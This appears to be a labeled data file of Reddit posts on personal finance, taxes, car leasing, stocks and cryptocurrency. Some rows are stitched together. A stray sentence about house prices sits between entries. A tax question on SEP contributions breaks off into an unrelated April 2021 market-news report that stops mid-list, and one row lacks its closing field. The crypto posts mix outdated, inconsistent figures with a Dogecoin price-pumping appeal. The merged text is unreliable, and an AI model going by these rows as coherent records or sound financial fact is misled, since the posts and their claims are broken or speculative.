economy,What are the advantages and disadvantages of a municipally vs federally mandated minimum wage?,"A federally mandated $15 minimum wage could become a reality in the U.S. However, in about[ half the states](https://www.cnbc.com/2021/02/21/15-minimum-wage-wont-cover-living-costs-for-many-americans.html), the cost of living would still eclipse earnings for workers paid $15 an hour. At the same time, a minimum wage of $15 would cover the living wages of single childless adults in states like Kentucky and Arkansas.

Instead of mandating a $15 minimum wage, what would be the advantages and disadvantages of a federal law that mandates a minimum living wage for every municipality? Every municipality could have its own commission that determines what are the COLs (Cost of Living) for an average person in each area. That way rural Arkansas could keep a $15 an hour wage, but urban areas with higher COLs could have higher wages.",finance

personalfinance,Creating a “balanced/diversified” portfolio,"I have read a ton of threads here and articles across the web but haven’t seen anyone address specifically what a “balanced” and “diversified” portfolio looks like these days. Everything I see seems based in a past reality. 

When I originally learned about stocks, the conventional wisdom was to hold bonds to protect against losses. They provided lower returns than stocks but didn’t have the loss potential (when buying treasuries and the like). I’ve held a couple bond funds that hold these assets in the last few years and they are not just flat they are losing money. I’ve since read about bonds and It seems like putting money there is a waste based on interest rates. 

I still have a ways to go until retirement so I can withstand risk, but I’m not someone who is really interested in going big on specific companies to try and get huge returns. But even with a “moderate risk” mindset, it seems like really the only option right now is to go all in on stocks because bonds, CDs, high yield savings accounts etc. all deliver such weak returns that are barely better than just holding onto cash. 

Am I missing something obvious? Is there something else I should be learning?",finance

personalfinance,Are There Any Advantages to Hold Off on Paying Debt?,"I make about 50k/year with little expenses. My main chunk of debts are student loans. All my federal loans are under a PSFL and I have about 62k private loans I'm trying to get rid of ASAP. The monthly payments on the private loans are around 500/month. The interest rates are between 9% and 4%.

I live in a HCOL area and currently living with my parents. I plan on moving soon because our wages are too low. I have about 17k in savings. One parent owns the house and has a reverse mortgage. The said parent won't be around forever, so I want to put my savings to at least 20k, obviously more if I can. I put about 500 away every paycheck. I live in Miami, and homes and apartments are being scooped up like you wouldn't believe.

I'm usually good with paying off credit card debt, but I have one that is currently at 2k debt because I had to take my car in for maintenance. Another card, I have about 600 in debt because I was doing some house projects for my parents. CC interest is around 20%. Another student loan at 9% interest has 1600 left. I tried refinancing the private loans but the debt to income ratio was too high at the time. I believe the private loan balance at the time was almost 80k. My goal was to pay off this loan, and the loan balance will drop to around 58-59K and try refinancing again. I try to put some money in a roth IRA. I was in school for so long, I'm so behind on retirement. I have a 403b that my company matches at 5%. I think that fund has about 25K. edit:I am in my mid-30s.

I have a trip coming up. I'm fully vaccinated as our my friends. The trip is because one of our friends is very ill. So we would like to see them for a short time before, you know...

If I clean up my debts, credit cards and student loan thats 1600 before the trip, my savings will be set back. But obviously the interest rate is bad. However, all the jobs that I'm applying for are in the DC area because of my background (political science). I've been interviewing and getting closer. I'm worried about 4-5k dropping from my savings. I can probably pay off all the debt in two months but I'm not sure if it's worth it to wait.

Edit: thank you, all. I paid off my credit card debts. As far as another job is concerned, I haven't found anything.  I live in Miami, Florida. We have low wages and live in a HCOL. I am also under the PSFL plan, because I work for a non-profit. There are not a lot of options here, unlike the DC-area but I will, of course, keep trying. Naturally, if I can double my salary for a private company, I will take it and I can always work for a non-profit later.",finance

The other factor is that with the crazy prices we can make more off our house and put down more money, so maybe I do that and wind up mortgaging the same amount as I would on a normal priced house.

personalfinance,Forbearance caused my loan balance to exceed initial loan amounts and it's wrecking my credit. What are my options?,"Due to a lot of trouble finding and maintaining a decent job, I've had to put my student loans in forbearance (I've always qualified for deferment but my loan servicer only told me about forbearance when I called for help) a few times, whenever it wasn't waived for being a student. As a result of that (and not having made payments for 6 years) each time has resulted in the interest being added to the principal. As a result, my two federal loans of 10k and 20k are currently at 13.7k and 25.1k. Apparently this has caused a big hit to my credit score while I am trying to get an auto loan. The loan guy I got this from suggested refinancing to a private lender to atleast reset it to a 100% balance rather than 130 and 125 as it is right now, but I am very hesitant to go to a private lender (while the rates would almost certainly be better than the 6.8 currently, my living situation is too unreliable and I need the flexibility and security that federal loans give me).

personalfinance,An alternative view of a car lease: Put Option to Return at Lease-end,"Don't get me wrong. I'm NOT saying leasing a car is a good financial choice for most ppl. Instead, I am trying to help ppl who are not familiar with a car lease. If you read till the end, you will understand why a lease is not cheaper than a loan. 

Here's the standard view of a $25k (including all fees) car lease.  
 
1. Make a small down pmt on a new car ($0 down is also possible) and drive away.  
2. Make 36 monthly lease pmt. This is calculated from adjusted capitalized cost (=lease term for a loan amount in car financing), residual value, money factor (=lease term for interest rate), sales tax.  
3. At lease-end, you have 2 options: either (a) return the car and pay ~$400 disposition fee + etc, or, (b) buy out the car by paying residual value + ~$50 fee.  

The above is how most ppl view a car lease and consider it's fundamentally different from a car loan. True, there are some technical differences between these 2 such as with a lease, you are never the owner and you are renting a new car for 3 years. But as far as financing is concerned, these 2 are similar, if you view the car lease as a car loan:  

1. The bank (=lessor) lends you $25k to be paid to the dealership (different company from lessor) so that you can take the new car home. You (=lessee) agree to pay back $25k in 3 years as described below.  
2. Instead of fully amortizing the $25k loan in 3 years, the terminal loan balance is equal to the residual value in the contract. This makes the monthly payment much smaller than a typical 5-yr car loan. Because of lower monthly payment, some ppl may think leasing is the cheaper option but it's not. For 3 years, you are only paying back the depreciation (=adjusted capitalized cost - residual value) + rent charge (aka interest, calculated from adjusted capitalized cost + residual value).  
3. At lease-end, you have 2 options to satisfy the loan (remember it will have a remaining balance because $25k isn't not fully amortized in 3 yrs): (a) return the vehicle in an excellent shape (if not, you pay excess wear/mileage) + disposition fee, or, (b) payoff the residual value (=remaining balance) + ~$50 fee.    

Are you still following? Now, you can consider the above option (a) as a put option because you have the right to sell the car at the residual value. If you exercise this put option (after paying disposition fee), you deliver the vehicle, receive exercise price (=residual value) to pay off the loan balance.  

FYI, I used the numbers from my previous lease contract to calculate how long it will take for my monthly payments to fully amortize the adjusted capitalized cost. It would take 9.4 years, which means it's effectively a 9.4-yr loan disguised as a 3-yr lease. If I had financed the same amount using a 5-yr loan at the same interest rate, my loan pmt would have been 72% higher than my lease pmt. It doesn't mean loan financing is more expensive because cost of debt should be measured in % interest rate rather than $ amount. Don't incorrectly assume leasing is cheaper because the monthly payment is lower. It's lower because it effectively has a longer term.",finance

personalfinance,Car financing approach,"I am reaching out to mitigate potential conflict in our marriage! :)  I am looking for your reasonable advice, not confirmation bias.

We are in the process of shopping for a car (bad timing, I know) for my wife.  We are planning to put down \~50% and borrow the rest, give or take.  Our credit is 800+ and therefore based on current manufacturer offers we expect to borrow at 0.0-2.9%.  We are looking at Toyota Hybrids in the $35k range and plan to keep the car for 8-10 years.

When it comes to 2 topics, we are struggling to agree on:

1. What is the best way to determine how much car we can afford?
2. With low interest rates and a sufficiently large down payment, is there any good reason to NOT take a 72 month loan?

On Point 1, I have seen anything from ""total monthly transportation costs (loan, insurance, interest, fuel, maintenance) not to exceed 10% of your take home pay"" to ""loan payment not to exceed 10% of take home pay"".  Obviously quite a large spread there.

On Point 2, my wife personally hates the idea of having 2 payments at a time (we have 10 months left on my car, at 0%).  She is also stuck on the idea of having no more than a 5 year loan for each of our cars, with no overlap.  From a cashflow perspective I kind of get it.  From the perspective of borrowing costs (loans are cheap right now), I don't get it.  She is also afraid of being underwater, which is highly unlikely with a \~50% down payment.

I think we should take advantage of low borrowing costs and ""you always have a car payment"", whether or not you have an open loan.  I see no problem in taking on a 6 year loan in this environment of low borrowing costs and especially since we can afford a hefty down payment, especially if we keep the car 8-10 years.  Cash flow is not an issue.

I don't want to discount her personal feelings, nor do I think they should outweigh any prudent financial decisions.  Help!

personalfinance,IRS Tax Calculator - Suggested additional withholdings too low?,"My wife and I both work and file jointly. I make about 133k/year she makes 143k/year. We both get bonuses which tax has already been included into our YTD federal taxes withheld.

Last year we checked off the optional higher withholding table checkbox on both our W-4s and still ended up having to owe on our taxes so this year I'm trying to use the IRS tax calculator to get more accurate with our withholdings.

First thing I did was remove the higher withholding checkbox on both of our W-4s to get our baseline for each job. We are now both paying taxes married filing jointly, but of course each job assumes its the sole household job, so we are obviously paying too little federal taxes.

Now after entering all my info into the tax calculator, we will underpay this year as expected. but the additional withholding that the Tax calculator is telling me to enter seems too low.

Our total anticipated tax obligation is $54,259 and if we kept our current baselines, we'd only be paying $42,153. We've already withheld $23,424 this year.

The estimator says for my job (weekly pay) ""To get to your desired refund amount, you will need $428 withheld from each paycheck, $187 more than your current tax withholding. Select Married filing jointly and enter $87 in additional withholding per pay period.""

My wife's (twice monthly) ""To get desired refund amount, you will need 1,040 withheld from each paycheck, $396 more than your current tax withholding. Select Married filing jointly and enter $211 in additional withholding per pay period.""

Why is the additional withholding recommended NOT $187 and $396 respectively?

If I do the math for each job with the recommended withholdings:

My job:

240 (current per pay period withheld) + 87 (additional withholding) \* 35 (pay periods left this year) = $11,445 tax to be withheld for the rest of year.

Wife's job

644 (current per pay period withheld) + 211 (additional withholding) \* 16 (pay periods left this year) = $13,680 tax to be withheld for the rest of year.

13,680 + 11,445 = 25,125 + 23,424 = $48,549 - this is lower than our expected tax obligation for the year.

If I take the $187 and $396 numbers, we are instead overpaying about $1000. I'd prefer to do that if I have to but.....not sure what I am missing here.

Happy to add anymore info if needed, we both do 401ks and cafeteria plans and I've triple checked all my numbers but not sure that's relevant for this particular question since its more about the tax obligation for WHATEVER numbers I put in not being met with the recommended withholding numbers.",finance

CryptoCurrency,The million dollar question: Will cryptocurrencies have a more widespread use?,"**There are currently more than 800 cryptocurrencies!**

Representing a collective capitalization of more than 2 Trillion dollars, which is a high number compared to less than 600 cryptocurrencies with a value of 12 billion dollars just some years earlier.

Cryptocurrencies can be defined as exclusively digital reading currencies that use special encryption and registration techniques called blockchain, which is responsible for regulating the creation of new currencies (“tokens”) and is independent of a central bank. Tokens are digital assets that can be transferred between two people without the need for external consent, essentially unique identifiers with a set of associated access rights. Blockchain protocols are capable of capturing greater wealth and value because they are very ""thick"" compared to the protocols of the past, which were much ""thinner"" (eg, the HTTP of a web page) and being unable to accumulate value financially, they accumulated value at the application layer. Blockchain protocols are ""thick"" due to the data link layer, as well as cryptographic ""access"" tokens, which have speculative value.

A token allows buyers to participate in a network, and even serves as an investment opportunity if the network gains popularity. Similar to how users can participate in a social network and obtain value for their participation in it, tokens also offer control over how users participate and offer a more equitable distribution of the wealth that the network is producing. Over time, the value of blockchain applications is expected to increase in absolute terms, as the space matures. However, the protocol layer must always retain a significant value due to the data link layer.

After four years of development of the associated infrastructure, cryptocurrencies have been made much more viable than before. Over the past few years, Bitcoin, the best-known cryptocurrency, has seen a recovery after several years of crash, dozens of exchange platforms have been opened around the world to facilitate the conversion of fiat currency (USD, EUR) To digital, major financial institutions are researching the blockchain, and Ethereum, the blockchain-based smart contract platform, is offering corporate support since its tokens have seen a surge since early 2017.

**Some examples of the increasingly widespread use of cryptocurrencies:**

* Bitcoin ATMs and prepaid debit cards are turning the buying and selling of cryptocurrencies into an accessible, simple and increasingly widespread experience. Cryptocurrency exchanges have experienced a dramatic increase in the volume of users and transactions during 2017. There are a total of more than 160 cryptocurrency exchange platforms worldwide, serving users seeking to convert cryptocurrencies into another digital or fiat currency. (such as USD or EUR) and 1,326 Bitcoin ATMs connected to such exchange platforms that allow transactions similar to ATMs. Coinsource, a US-based Bitcoin ATM network, installs 2.3 machines each week in key accessible locations such as convenience stores. On the other hand, some exchange platforms such as Coinbase, are differentiating themselves by offering a modern and simple user experience, aimed at beginners in cryptocurrency investment. In addition, there are currently more than a dozen Bitcoin debit cards available, which can be used anywhere normal credit cards are accepted.
* Initial Coin Offerings (ICOs) have become increasingly popular as a previously unregulated (and controversial) way to raise money for startups by selling their own virtual currencies. ICOs accounted for 8 of the top 10 crowdfunding projects in history, as investors increased their interest in cryptocurrencies and their associated assets. Tech firms have raised $ 1.1 billion from 89 coin sales this year (10 times more than in 2016), with another 110 ICOs that had been planned. A coin offering can be considered a hybrid between a Kickstarter campaign and an initial public offering (IPO) - it allows investors to reserve a product or service before it is ready to go on the market and share in the proceeds if the offering becomes popular and the token is appreciated. A well-known venture capitalist remarked in May 2017 that ""tokens will break the barrier between professional investors and \[hobbyist\] token buyers, in the same way that the Internet broke down the barrier between professional journalists and tweeters and bloggers."" However, this view is impacted by the SEC's conclusion that at least some ICOs are securities and are subject to federal securities law, causing the cryptocurrency market to crash across the board.
* Cryptocurrency remittance companies are serving individuals and businesses around the world, and have gained recognition within mainstream Fintech. Blockchain-based companies are solving the problem of remittances, which have long been characterized by exorbitant fees and long settlement times. These companies allow a fast, safe and economical money transfer taking advantage of the peer-to-peer network. The global settlement network Ripple and its cryptocurrency have focused on supporting an interoperable global money system in which monetary value can flow seamlessly from the bank ledger to the public blockchain into a mobile money system. The company has 60 banks working to commercially implement its technology, including Santander, Royal Bank of Canada and Mitsubishi UFJ Financial Group. Ripple has recently been a partner of Siam Commercial Bank and Japan’a SBI to launch the first payment service through blockchain between Japan and Thailand, through which a flow of 250 million dollars in remittances has been issued per year. Also, a large number of other cryptocurrency remittance companies have emerged around the world, such as Bitpesa in Africa and Bitspark and Everex in Asia. Taking into account the large number of people who send and receive money through remittances globally, these companies have a high potential in order to take a big step towards the introduction of blockchain and cryptocurrencies to a large number of individuals.
* Cryptocurrency exchange platforms are simplifying cryptocurrency purchase transactions for merchants and buyers, thereby catalyzing greater commercial adoption. In November 2013, Coinbase's founders searched for 10 companies with sales of 1 over a billion dollars willing to accept Bitcoins. In 2 months, Overstock.com signed, and the first purchase was made within 10 days. Soon after, Dell, Microsoft, and other companies signed the deal, leading more than 45,000 merchants to accept cryptocurrency through Coinbase. With the acceptance of cryptocurrency, merchants should be able to reduce transaction fees, eliminate fraud, pay quickly, and issue simple refunds. Recently, Apple approved Cryptocurrency Dash for use in applications from its App Store, now allowing Dash to be integrated into any iOS application.
* As popular demand for cryptocurrencies grows, regulators and flaggers are under tremendous pressure to offer more clarity on where digital currencies are located. Uncertainty about the legal, tax, and accounting status of cryptocurrency, as well as fear of impending changes, can slow down adoption or lead to rampant speculation. Some advances that have emerged in different countries of the world regarding these aspects are the following:

1. Russia: In less than a year, Russian officials have gone from proposing a cryptocurrency ban that would imprison criminals, to suggesting legalization, launching their own cryptocurrency and discussing the possibility of exchanging cryptocurrencies on major exchanges Russian.
2. China: China's three largest Bitcoin exchanges recently lifted a self-imposed moratorium on withdrawals, which was implemented in 2017 following scrutiny by Chinese authorities on capital flight and money laundering.
3. Japan: Based on the Mt. Gox Exchange, Japan recently introduced legislation to protect users from similar collapses, so that exchanges can comply with anti-money laundering regulation, and to officially authorize cryptocurrencies as normal payment method. In July 2017, Japan also exempted cryptocurrency from the 8% consumption tax, treating virtual currency transfers as non-taxable transactions, as cryptocurrencies were officially defined as a means of payment.
4. Switzerland: Switzerland seeks to lead the way to promote the growth of cryptocurrencies by making some contribution to its rules and regulations, and consequently attracting startups to its Crypto Valley (headquarters of the blockchain companies Xapo, Shapeshift and Ethereum). The proposed idea is to create ""sandboxes"" where startups and small companies can experiment and innovate under controlled conditions.
5. USA: In the USA, as Bitcoin becomes a more household word, the FASB (US GAAP standard setter) is considering developing accounting guidelines for digital currencies. Some believe that digital currency should be accounted for as cash, others as securities, and still others are pushing for it to be accounted for as intangible assets or inventory. With companies like Microsoft, Dell, and Overstock.com accepting digital currency as a form of payment, conflicting approaches are likely to lead to audit questions that could put off investors.

personalfinance,Logistics of buying new home before selling current when current IS paid off - after sale can/should I turn around and dump the proceeds toward my new mortgage?,"Hi all,

Been trying to research this scenario but everything I can find refers to scenarios where current home is still mortgaged. In my case, my current home IS paid off and I own it outright. I would like to purchase my new home with a mortgage, put down my own money as down payment (not relying on the current house as down payment) and then give myself a couple of months to get moved and get the old place cleaned up.

My question is - once I get the proceeds from my current house (likely to be $250-300k) what do I do with them? I am already maxing out my retirement and have an emergency fund/savings (separate from the down payment). Is it possible to just turn around and dump that sum toward my new mortgage for a lower payment (without refinancing)? If it's possible, is that wise - or should I be looking to invest the money instead since my mortgage interest rate is low?

From what I've read - in the typical scenario where you still owe on the current home, it's typical to do a contingent sale and then the proceeds from current house lower the mortgage on the new house. But in this case there will be a gap of several months between finalizing the purchase of the new house and getting proceeds from the old one.

Thanks.",finance
Bitcoin,What Stops the Fed From Buying Up Bitcoin?,,cryptocurrency
CryptoCurrency,The higher the APY the more cautious you need to be.,"About a month ago I started dipping my toes into defi. You see things where there are 1,000%+ APY on your deposits and you can easily be lured in by hopes of high returns, but you really need to take a step back.

For projects that can offer you interest on your crypto, there are three categories, scams, projects that have a low chance of success, and proven solid projects.

The way the majority of programs give you those high interest rates is because they give you their own tokens. When the project is new and there aren't a lot of tokens being traded, the token price can get really high. But as more coins are distributed the price of the coin is going to come down with it. 

As more coins are put out on the market, the price lowers, which lowers the APY, which makes people move on to somewhere else, which lowers the amount of people looking to buy the coin, which lowers the price and the cycle continues. A lot of these coins are governance tokens, which can let you vote on things related to the project, but ultimately don't have any real value.

It is not just a rug pull that you need to be aware of, the value of the token can drop to zero incredibly fast. If you are interested in doing yield farming, start with small amounts (despite the temptation to go big), and try to avoid holding on to their token whenever possible. 

This is the biggest way for people to lose their money in the market right now, so be on your guard.",cryptocurrency

personalfinance,"Would it be better to add additional federal withholding for second job income, or just pay tax bill at end of year? (2021 taxes)","So, I went through the Tax Withholding calculator on the IRS website, and after plugging in the numbers from my two jobs (one FT, one PT), it looks like I will owe \~700 in additional withholding. Some context:

1. This is my first time paying big boy taxes (first FT job).
2. The PT job is under 6,000 a year, so there are no federal withholdings from the employer.
3. The FT job is 60,000 a year, and am paying taxes as normal.
4. Both jobs are paid bi-weekly.

If I do not update my W4 to include second job income, I will owe the above \~700 in additional withholding, but I'm wondering if its better to just pay that when taxes are due, or adjust my W4 now?

I'm thinking investing the extra monthly income saved from not having additional withholding taken out of my paycheck bi-weekly would seem better financially, and just keeping a small sum put away for my tax bill and paying that would be fine. Besides, if I adjust my W4 now, I will still likely owe some since I've been working on the job for about 4 months now without the additional withholding.

Is my line of reasoning correct? Any advice would be great.",finance

personalfinance,SEP Contribution Question - Extending Taxes,"The accountant that did my 2019 taxes said I could make contributions to my SEP up until he filed my taxes including extensions. So I made contributions in 2020, before he filed my federal return. All contributions were made prior to my federal return was filed. This amount was included in TDA‘s 2020 1098 (clearly they dont’ know what my tax return says).

My new 2020 accountant is tellng me that he must use the amount on my TD 1098 from 2020 which includes the contribution that was claimed as a deduction in 2019. So that is being double counted now in 2019 and 2020 if i follow his interpretation of the publication.

I made over $15k in contributions in 2021 to claim on my 2020 return but he says he cannot count them for 2020. The BIGGER issue is I will likely have no income in 2021 and so this SEP contribution will be over the IRS limit. 

If I’m reading this right, the IRS says my first accountant is right.

The market fell on Friday after a record-setting session, with the S&amp;P 500 (SPY) pulling back after recording fresh intraday highs. Market participants continue to assess the slew of corporate earnings reports and recent, encouraging economic data. 

Last night, President Biden addressed a joint session of Congress, during which he said “America was back on the move again” following the coronavirus pandemic that devastated the economy. In his address, President Biden touted his $2 trillion infrastructure plan and unveiled a new $1.8 trillion proposal aimed at supporting children, students, and families. This proposal, called the American Families Plan, would be funded in part with the newly proposed tax increases on the wealthy. [Read the details of the proposal here](https://www.whitehouse.gov/briefing-room/statements-releases/2021/04/28/fact-sheet-the-american-families-plan/).

Shares of Amazon (AMZN) outperformed the market, jumping to a new record high after reporting blowout Q1 earnings fueled by sustained demand, showing great strength even as the economy in the US begins to reopen. Shares of Twitter, on the other hand, sunk after the company fell short of estimates, disappointing investors who hoped the company would show a strong pick-up in ad sales like peers Snap (SNAP) and Facebook (FB).

Market participants also digested recent commentary from members of the Federal Open Market Committee (FOMC), which included no major changes to policy but did highlight recent improvements in the US economy. FOMC members said the effective distribution of the vaccine in the US has improved economic conditions but reiterated interest rates will remain near-zero and the current pace of the asset purchasing program in place. The Fed said, “Amid progress and strong policy support, indicators of economic activity and employment have risen.” The committee remains optimistic about the rebound in economic activity, describing the most affected sectors as “having shown improvement”, but shows no signs of slowing quantitative easing or raising interest rates. With more than 8 million people still out of jobs compared to pre-pandemic levels, FOMC reiterated its commitment to supporting the economy.

**Highlights**

* The Labor Department released its Weekly Unemployment Report, which shows fresh pandemic-era lows as the economy gradually reopens.
   * **Initial jobless claims, week ended April 24:** 553,000 vs. 540,000 expected and an upwardly revised 566,000 during the prior week

stocks,Is F.A.A.N.G becoming boring? What will be the staples for growth portfolios in the next decade?,"Yes we know they make fistfuls of money. They are all solid staples to any portfolio. Though I feel the luster is wearing off. These companies all speak to an era that disrupted society. Watching (and living) through the huge change these companies brought to society was a really neat experience. They collectively changed how we function in every way today.

Facebook: Like MySpace but better! Introduced society to a social media experiment that has changed our lives and the way we connect in every way. Now there are many platforms (with less users) doing the same thing. 

Apple: Media players were all called Ipods. Smartphones were all called Iphones. Tablets were all called Ipads. They completely changed how we connect with one another and with our various forms of entertainment. They ushered in a whole new generation of technology. Their loyal fanbase is what matters and I appreciate the company for the products they produce but it seems like everyone is doing what they do nowadays (they just do it a bit better). An upgrade from 1 camera lens to 3 doesn't excite me. 

Amazon: Prime Delivery. Getting stuff to your door in 2 days. GROUND BREAKING. I got hooked and never went back. Ordering from anywhere else was unacceptable. They fed our desire for ""immediate satisfaction"" and set a standard for everyone else to meet. Their entry into smart devices was a valiant effort and their web services have taken the world by storm (whether anyone really knows it or not). Now every retailer is expected to offer free shipping at the same precedent that Amazon set years ago. Maybe they will be able to accomplish drone delivery services but there are many unforeseen complications to that. This would definitely considered ""disrupting"" society once again. 

Netflix: Mail to home service turned video streaming service. Streaming movies at your fingertips was game changing. Today there are dozens of quality companies video streaming. Exclusive content from Netflix is great. They started down that path early enough knowing that others would follow them into the streaming space but how are they changing life today?

Google: ""Google It."" When this became the generic term for looking up content you knew they won the battle. Built on a search engine that boasted NO ADS to steal away from ""ask Jeeves"" and ""yahoo"" among others they changed the simplicity of search as we know it today. 

Thinking about these companies over the last 5 years are really quite boring. They make tons of money. They still don't excite me to own them. They have gotten so huge it is actually a bit scary in some ways. I feel they will migrate out of growth and into dividend portfolios over the next 5-10 years but I could be completely wrong. 

TL;DR What companies do you believe will make up the ""BIG 5"" of the future that will disrupt the way society operates today? Or do you think that F.A.A.N.G. will succeed in disrupting our everyday lives once again?",finance

dogecoin,HODL Is the Way,"If everyone who owns Dogecoin views the blockchain as a real community-driven, non-selfish effort -- with the primary objective to HODL -- this non-selfish perspective will fuel each of our selfish hopes and wishes for wealth and abundance.

Here's how this works. Nobody sells unless they need the money. Each person can decide what ""need the money"" means for him or herself, and do it with a sense of fairness (and we can even buy the cool stuff we want too because there is plenty of abundances to go around) -- and we do it with the perspective ""Do Only Good Everyday."" We just don't dump our bags into fiat or some other coin.

If no one sells unless they need the money, the value will rise. This means we trust each other, as Shibes, to make the right choices for our community. As the value of Dogecoin grows over time, we will trust each other more and more, not to dump on our fellow Shibes. This will eliminate the tendency to sell out of fear -- because we will have no fear -- because we will trust each other.

This will also mean that, eventually, we will trust the Doge community more than the United States government and the federal reserve. The federal reserve constantly dumps on the American citizens, printing money and giving it to banks which then dump cash into the market, diluting supply and making each USD  have a lesser and lesser value and a lower purchasing power. And this doesn't just hurt US Shibes, but it hurts the entire world -- as so many foreign banks, companies, government, and individuals are HODLing vast reserves of USD as well. In fact, the USD and Federal Reserve are literally shafting everyone -- even themselves.

The coolest part about all of this is that a MASSIVE percentage of the dogecoin community -- if not most of us -- is already trusting in its fellow Shibes. I would imagine that quite a few of the people reading this trust the Doge community more than the U.S. Federal Reserve, and over time, this number will grow higher and higher. Until in the very near future, the price of Dogecoin will exceed $1 USD -- and go further beyond that price than any of us could have imagined.

I'm sure I'll get some angry responses to this, but if you agree, what do you think? Can you imagine if Dogecoin became a true community service, where we HODL this massive reserve of assets and only dip into it and sell when we need something? Of course, this need could be a house, a Tesla, college costs, a vacation... It can be something nice! The thing is, we agree to HODL our Doge bags instead of dumping them all and leaving the community behind. This will ultimately grow our sense of trust in each other -- and SKYROCKET the value of DOGECOIN to the Moon, Mars, Uranus, and beyond.

In eGod We Trust.
